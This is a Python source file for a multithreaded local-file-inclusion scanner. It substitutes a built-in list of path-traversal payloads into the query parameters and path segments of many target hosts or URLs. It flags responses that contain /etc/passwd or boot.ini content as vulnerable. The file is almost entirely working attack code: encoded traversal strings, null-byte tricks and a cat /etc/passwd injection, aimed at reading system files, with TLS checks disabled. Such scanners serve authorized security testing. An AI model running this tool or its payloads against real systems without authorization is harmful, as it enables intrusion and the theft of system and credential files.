#!/usr/bin/python3

import os
import sys
import re
import time
import copy
import random
import argparse
import requests
import urllib.parse
from functools import partial
from threading import Thread
from queue import Queue
from multiprocessing.dummy import Pool
from colored import fg, bg, attr

MAX_EXCEPTION = 100
MAX_VULNERABLE = 100

# disable "InsecureRequestWarning: Unverified HTTPS request is being made."
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def banner():
	print("""
                        | |  / _| (_)      _ __    _   _
                        | | | |_  | |     | '_ \  | | | |
                        | | |  _| | |  _  | |_) | | |_| |
                        |_| |_|   |_| (_) | .__/   \__, |
                                          |_|      |___/

                    by @gwendallecoguic

""")
	pass


def rebuiltQuery( t_params ):
    query = ''
    for pname,t_values in t_params.items():
        for k in range(len(t_values)):
            query = query + pname+'='+t_values[k] + '&'
    return query.strip('&')


def _parse_qs( query ):
    t_params = {}
    tmptab = query.split('&')

    for param in tmptab:
        t_param = param.split('=')
        pname = t_param[0]
        if not pname in t_params:
            t_params[pname] = []
        pvalue = '' if len(t_param) < 2 else t_param[1]
        t_params[pname].append( pvalue )

    return t_params


def testParams( t_urlparse, payload ):
    # t_params = urllib.parse.parse_qs( t_urlparse.query )
    t_params = _parse_qs( t_urlparse.query )

    for pname,t_values in t_params.items():
        for k in range(len(t_values)):
            pvalue = t_values[k]
            t_params2 = copy.deepcopy(t_params)
            # if pvalue == '':
            #     pvalue = 666
            # it's replacement mode, not concat
            new_value = payload
            # new_value = str(pvalue) + payload
            # t_params2[pname][k] = urllib.parse.quote( new_value )
            t_params2[pname][k] = new_value
            new_query = rebuiltQuery( t_params2 )
            t_urlparse = t_urlparse._replace(query=new_query)
            url = urllib.parse.urlunparse(t_urlparse)
            doTest( url )
            # disable get/post swap
            # t_urlparse = t_urlparse._replace(query='')
            # url = urllib.parse.urlunparse(t_urlparse)
            # doTest( url, 'POST', t_params2 )


def testFragment( t_urlparse, payload ):
    # new_value = t_urlparse.fragment + urllib.parse.quote(payload)
    new_value = t_urlparse.fragment + payload
    t_urlparse = t_urlparse._replace(fragment=new_value)
    url = urllib.parse.urlunparse(t_urlparse)
    doTest( url )


def testPath( t_urlparse, payload ):
    path = ''
    t_path = ['/'] + t_urlparse.path.split('/')
    # print(t_path)

    for dir in t_path:
        if len(dir):
            path = path + '/' + dir
            path = path.replace('//','/')
            # new_value = os.path.dirname(t_urlparse.path) + '/' + urllib.parse.quote(payload)
            # new_value = path + '/' + urllib.parse.quote(payload)
            new_value = path + '/' + payload
            # new_value = new_value.replace('//','/')
            t_urlparse = t_urlparse._replace(path=new_value)
            url = urllib.parse.urlunparse(t_urlparse)
            doTest( url )


def testPayload( url, payload ):
    t_urlparse = urllib.parse.urlparse( url )

    if len(t_urlparse.query):
        testParams( t_urlparse, payload )
        # testParams( t_urlparse, payload.strip('/') )

    # if len(t_urlparse.fragment):
    #     testFragment( t_urlparse, payload.strip('/') )

    testPath( t_urlparse, payload )


def testURL( url ):
    time.sleep( 0.01 )
    t_multiproc['n_current'] = t_multiproc['n_current'] + 1

    if _verbose <= 1:
        sys.stdout.write( 'progress: %d/%d\r' %  (t_multiproc['n_current'],t_multiproc['n_total']) )
        # t_multiproc['n_current'] = t_multiproc['n_current'] + 1

    pool = Pool( 10 )
    pool.map( partial(testPayload,url), t_payloads )
    pool.close()
    pool.join()


def doTest( url, method='GET', post_params='' ):

    # with open('generated_urls', 'a+') as fp:
    #     fp.write(url+"\n")
    # return

    # t_realdotest.append( [url,method,post_params] )
    realDoTest( [url,method,post_params] );
    return


def realDoTest( t_params ):

    url = t_params[0]
    method = t_params[1]
    post_params = t_params[2]

    if _verbose <= 1:
        sys.stdout.write( 'progress: %d/%d\r' %  (t_multiproc['n_current'],t_multiproc['n_total']) )
        # t_multiproc['n_current'] = t_multiproc['n_current'] + 1

    t_urlparse = urllib.parse.urlparse(url)
    u = t_urlparse.scheme + '_' + t_urlparse.netloc

    # if not u in t_exceptions:
    #     t_exceptions[u] = 0
    # if t_exceptions[u] >= MAX_EXCEPTION:
    #     if _verbose >= 3 and _verbose < 4:
    #         print("skip too many exceptions %s" % t_urlparse.netloc)
    #     return

    # if not u in t_vulnerable:
    #     t_vulnerable[u] = 0
    # if t_vulnerable[u] >= MAX_VULNERABLE:
    #     if _verbose >= 3 and _verbose < 4:
    #         print("skip already vulnerable %s" % t_urlparse.netloc)
    #     return

    try:
        if method == 'POST':
            r = requests.post( url, data=post_params, headers=t_custom_headers, timeout=5, verify=False )
        else:
            r = requests.get( url, headers=t_custom_headers, timeout=5, verify=False )
    except Exception as e:
        # t_exceptions[u] = t_exceptions[u] + 1
        if _verbose >= 3 and _verbose < 4:
            sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
        return

    if 'Content-Type' in r.headers:
        content_type = r.headers['Content-Type']
    else:
        content_type = '-'

    # print(r.text)
    # if 'root:' in r.text or '[boot loader]' in r.text:
    if 'root:x:' in r.text or 'root:*:' in r.text or 'root:!:' in r.text or 'root:!!:' in r.text or 'root:$:' in r.text or 'root::' in r.text or '[boot loader]' in r.text:
        vuln = 'VULNERABLE'
    else:
        vuln = '-'

    # if vuln == 'VULNERABLE':
    #     t_vulnerable[u] = t_vulnerable[u] + 1

    # output = '%sC=%d\t\tT=%s\t\tV=%s\n' %  (url.ljust(t_multiproc['u_max_length']),r.status_code,content_type,vuln)
    output = '%s\t\tC=%d\t\tT=%s\t\tV=%s\n' %  (url,r.status_code,content_type,vuln)

    fp = open( t_multiproc['f_output'], 'a+' )
    fp.write( output )
    fp.close()

    if vuln == 'VULNERABLE' or (_verbose >= 2 and _verbose < 4):
        if vuln == 'VULNERABLE':
            sys.stdout.write( '%s%s%s' % (fg('light_red'),output,attr(0)) )
        else:
            sys.stdout.write( output )


parser = argparse.ArgumentParser()
parser.add_argument( "-a","--path",help="set paths list" )
parser.add_argument( "-d","--header",help="custom headers, example: cookie1=value1;cookie2=value2...", action="append" )
parser.add_argument( "-p","--payloads",help="set payloads list" )
parser.add_argument( "-o","--hosts",help="set host list (required or -u)" )
# parser.add_argument( "-r","--redirect",help="follow redirection" )
parser.add_argument( "-s","--scheme",help="scheme to use, default=http,https" )
parser.add_argument( "-t","--threads",help="threads, default 10" )
parser.add_argument( "-u","--urls",help="set url list (required or -o)" )
parser.add_argument( "-w","--windows",help="only windows payloads", action="store_true" )
parser.add_argument( "-wl","--winux",help="windows and linux payloads", action="store_true" )
parser.add_argument( "-v","--verbose",help="display output, 0=nothing, 1=only vulnerable, 2=all requests, 3=full debug, 4=only vulnerable,no extra text like banner, default: 1" )
parser.parse_args()
args = parser.parse_args()

if args.verbose:
    _verbose = int(args.verbose)
else:
    _verbose = 1

if _verbose < 4:
    banner()

if args.scheme:
    t_scheme = args.scheme.split(',')
else:
    t_scheme = ['http','https']

t_custom_headers = {}
if args.header:
    for header in args.header:
        if ':' in header:
            tmp = header.split(':')
            t_custom_headers[ tmp[0].strip() ] = tmp[1].strip()

t_hosts = []
if args.hosts:
    if os.path.isfile(args.hosts):
        fp = open( args.hosts, 'r' )
        t_hosts = fp.read().strip().split("\n")
        fp.close()
    else:
        t_hosts.append( args.hosts )
n_hosts = len(t_hosts)
if _verbose < 4:
    sys.stdout.write( '%s[+] %d hosts found: %s%s\n' % (fg('green'),n_hosts,args.hosts,attr(0)) )

t_urls = []
if args.urls:
    if os.path.isfile(args.urls):
        fp = open( args.urls, 'r' )
        t_urls = fp.read().strip().split("\n")
        fp.close()
    else:
        t_urls.append( args.urls )
else:
    while True:
        try:
            url = input()
        except EOFError:
            break
        else:
            t_urls.append( url )

n_urls = len(t_urls)
if _verbose < 4:
    sys.stdout.write( '%s[+] %d urls found: %s%s\n' % (fg('green'),n_urls,args.urls,attr(0)) )

if n_hosts == 0 and n_urls == 0:
    parser.error( 'hosts/urls list missing' )

if args.payloads:
    t_payloads = []
    if os.path.isfile(args.payloads):
        fp = open( args.payloads, 'r' )
        t_payloads = fp.read().strip().split("\n")
        fp.close()
    else:
        t_payloads.append( args.payloads )
    n_payloads = len(t_payloads)
    if _verbose < 4:
        sys.stdout.write( '%s[+] %d payloads found: %s%s\n' % (fg('green'),n_payloads,args.payloads,attr(0)) )
else:
    n_payloads = 0

t_path = [ '' ]
if args.path:
    if os.path.isfile(args.path):
        fp = open( args.path, 'r' )
        t_path = fp.read().strip().split("\n")
        fp.close()
    else:
        t_path.append( args.path )
n_path = len(t_path)
sys.stdout.write( '%s[+] %d path found: %s%s\n' % (fg('green'),n_path,args.path,attr(0)) )

if args.threads:
    _threads = int(args.threads)
else:
    _threads = 10

t_totest = []
u_max_length = 0
d_output =  os.getcwd()+'/lfi'
f_output = d_output + '/' + 'output'
if not os.path.isdir(d_output):
    try:
        os.makedirs( d_output )
    except Exception as e:
        sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
        exit()

if _verbose < 4:
    sys.stdout.write( '%s[+] options are -> threads:%d, verbose:%d%s\n' % (fg('green'),_threads,_verbose,attr(0)) )
    # sys.stdout.write( '[+] computing host and payload list...\n' )


# source: https://github.com/jhaddix/SecLists/blob/master/Fuzzing/LFI-JHADDIX.txt
t_payloads_linux = [
    '%00../../../../../../etc/passwd',
    '%00/etc/passwd%00',
    '%0a/bin/cat%20/etc/passwd',
    '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
    '..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd',
    '\\&apos;/bin/cat%20/etc/passwd\\&apos;',
    '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
    '/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd',
    '/etc/default/passwd',
    '/etc/master.passwd',
    '/./././././././././././etc/passwd',
    '/../../../../../../../../../../etc/passwd',
    '/../../../../../../../../../../etc/passwd^^',
    '/..\../..\../..\../..\../..\../..\../etc/passwd',
    '/etc/passwd',
    'file:///etc/passwd',
    '../../../../../../../../../../../../../../../../../../../../../../etc/passwd',
    '...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//etc/passwd',
    '..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././etc/passwd',
    '..\..\..\..\..\..\..\..\..\..\etc\passwd',
    '.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd',
    '\..\..\..\..\..\..\..\..\..\..\etc\passwd',
    'etc/passwd',
    '/etc/passwd%00',
    '../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00',
    '..\..\..\..\..\..\..\..\..\..\etc\passwd%00',
    '\..\..\..\..\..\..\..\..\..\..\etc\passwd%00',
    '/../../../../../../../../../../../etc/passwd%00.html',
    '/../../../../../../../../../../../etc/passwd%00.jpg',
    '../../../../../../etc/passwd&=%3C%3C%3C%3C',
    '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd',
    '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00',
    '💩../../../../../../etc/passwd',
    '💩/etc/passwd💩',
    '/etc/passwd💩',
    '../../../../../../../../../../../../../../../../../../../../../../etc/passwd💩',
    '..\..\..\..\..\..\..\..\..\..\etc\passwd💩',
    '\..\..\..\..\..\..\..\..\..\..\etc\passwd💩',
    '/../../../../../../../../../../../etc/passwd💩.html',
    '/../../../../../../../../../../../etc/passwd💩.jpg',
    '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd💩',
    '#../../../../../../etc/passwd',
    '#/etc/passwd#',
    '/etc/passwd#',
    '../../../../../../../../../../../../../../../../../../../../../../etc/passwd#',
    '..\..\..\..\..\..\..\..\..\..\etc\passwd#',
    '\..\..\..\..\..\..\..\..\..\..\etc\passwd#',
    '/../../../../../../../../../../../etc/passwd#.html',
    '/../../../../../../../../../../../etc/passwd#.jpg',
    '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd#',
    '/asset////////////////../../../../../../../../etc/passwd',
    '//////////////////../../../../../../../../etc/passwd',
    'file:/etc/passwd?/',
    'file:/etc/passwd%3F/',
    'file:/etc%252Fpasswd/',
    'file:/etc%252Fpasswd%3F/',
    'file:///etc/?/../passwd',
    'file:///etc/%3F/../passwd',
    'file:${br}/et${u}c/pas${te}swd?/',
    'file:$(br)/et$(u)c/pas$(te)swd?/',
    'file:${br}/et${u}c%252Fpas${te}swd?/',
    'file:$(br)/et$(u)c%252Fpas$(te)swd?/',
    'file:${br}/et${u}c%252Fpas${te}swd%3F/',
    'file:$(br)/et$(u)c%252Fpas$(te)swd%3F/',
    'file:///etc/passwd?/../passwd',
    '/etc/passwd?/',
    '/etc/passwd%3F/',
    '/etc%252Fpasswd/',
    '/etc%252Fpasswd%3F/',
    '///etc/?/../passwd',
    '///etc/%3F/../passwd',
    '${br}/et${u}c/pas${te}swd?/',
    '$(br)/et$(u)c/pas$(te)swd?/',
    '${br}/et${u}c%252Fpas${te}swd?/',
    '$(br)/et$(u)c%252Fpas$(te)swd?/',
    '${br}/et${u}c%252Fpas${te}swd%3F/',
    '$(br)/et$(u)c%252Fpas$(te)swd%3F/',
    '///etc/passwd?/../passwd'
]
t_payloads_windows = [
    'C:/boot.ini',
    'C:\boot.ini',
    '%00../../../../../../boot.ini',
    '%00/boot.ini%00',
    '%0a/bin/cat%20/boot.ini',
    '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini',
    '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2%2Fboot.ini',
    '..%2F..%2F..%2F%2F..%2F..%2/boot.ini',
    '\\&apos;/bin/cat%20/boot.ini\\&apos;',
    '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/boot.ini',
    '/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini',
    '/default/boot.ini',
    '/master.boot.ini',
    '/./././././././././././boot.ini',
    '/../../../../../../../../../../boot.ini',
    '/../../../../../../../../../../boot.ini^^',
    '/..\../..\../..\../..\../..\../..\../boot.ini',
    '/boot.ini',
    'file:///boot.ini',
    '../../../../../../../../../../../../../../../../../../../../../../boot.ini',
    '...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//boot.ini',
    '..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././boot.ini',
    '..\..\..\..\..\..\..\..\..\..\boot.ini',
    '.\\./.\\./.\\./.\\./.\\./.\\./boot.ini',
    '\..\..\..\..\..\..\..\..\..\..\boot.ini',
    'boot.ini',
    '/boot.ini%00',
    '../../../../../../../../../../../../../../../../../../../../../../boot.ini%00',
    '..\..\..\..\..\..\..\..\..\..\boot.ini%00',
    '\..\..\..\..\..\..\..\..\..\..\boot.ini%00',
    '/../../../../../../../../../../../boot.ini%00.html',
    '/../../../../../../../../../../../boot.ini%00.jpg',
    '../../../../../../boot.ini&=%3C%3C%3C%3C',
    '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..22fboot.ini',
    '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..22fboot.ini%00',
    '💩../../../../../../boot.ini',
    '💩/boot.ini💩',
    '/boot.ini💩',
    '../../../../../../../../../../../../../../../../../../../../../../boot.ini💩',
    '..\..\..\..\..\..\..\..\..\..\boot.ini💩',
    '\..\..\..\..\..\..\..\..\..\..\boot.ini💩',
    '/../../../../../../../../../../../boot.ini💩.html',
    '/../../../../../../../../../../../boot.ini💩.jpg',
    '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..22fboot.ini💩',
    '#../../../../../../boot.ini',
    '#/boot.ini#',
    '/boot.ini#',
    '../../../../../../../../../../../../../../../../../../../../../../boot.ini#',
    '..\..\..\..\..\..\..\..\..\..\boot.ini#',
    '\..\..\..\..\..\..\..\..\..\..\boot.ini#',
    '/../../../../../../../../../../../boot.ini#.html',
    '/../../../../../../../../../../../boot.ini#.jpg',
    '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..22fboot.ini#',
]

if not n_payloads:
    t_payloads = t_payloads_linux
    if args.windows:
        t_payloads = t_payloads_windows
    elif args.winux:
        t_payloads = t_payloads + t_payloads_windows

for scheme in t_scheme:
    for host in t_hosts:
        for path in t_path:
            u = scheme + '://' + host.strip() + path
            t_totest.append( u )
            l = len(u)
            if l > u_max_length:
                u_max_length = l

for url in t_urls:
    for path in t_path:
        u = url.strip() + path
        t_totest.append( u )
        l = len(u)
        if l > u_max_length:
            u_max_length = l

# old version
# for scheme in t_scheme:
#     for host in t_hosts:
#         for payload in t_payloads:
#             for path in t_path:
#                 u = scheme + '://' + host.strip() + path + payload
#                 t_totest.append( u )
#                 l = len(u)
#                 if l > u_max_length:
#                     u_max_length = l

# for url in t_urls:
#     for payload in t_payloads:
#         for path in t_path:
#             u = url.strip() + path + payload
#             t_totest.append( u )
#             l = len(u)
#             if l > u_max_length:
#                 u_max_length = l

n_totest = len(t_totest)

# random.shuffle(t_totest)
# print("\n".join(t_totest))
# exit()

t_realdotest = []
t_exceptions = {}
t_vulnerable = {}
t_multiproc = {
    'n_current': 0,
    'n_total': n_totest,
    'u_max_length': u_max_length+5,
    'd_output': d_output,
    'f_output': f_output,
}

def doWork():
    while True:
        url = q.get()
        testURL( url )
        q.task_done()

q = Queue( _threads*2 )

for i in range(_threads):
    t = Thread( target=doWork )
    t.daemon = True
    t.start()

try:
    for url in t_totest:
        q.put( url )
    q.join()
except KeyboardInterrupt:
    sys.exit(1)



exit()


if _verbose < 4:
    sys.stdout.write( '%s[+] %d urls payloaded to test.%s\n' % (fg('green'),len(t_realdotest),attr(0)) )
    sys.stdout.write( '[+] testing...\n' )


t_exceptions = {}
t_vulnerable = {}
t_multiproc = {
    'n_current': 0,
    'n_total': len(t_realdotest),
    'u_max_length': u_max_length+5,
    'd_output': d_output,
    'f_output': f_output,
}

def realDoWork():
    while True:
        params = q.get()
        realDoTest( params )
        q.task_done()

q = Queue( _threads*2 )

for i in range(_threads):
    t = Thread( target=realDoWork )
    t.daemon = True
    t.start()

try:
    for url in t_realdotest:
        q.put( url )
    q.join()
except KeyboardInterrupt:
    sys.exit(1)

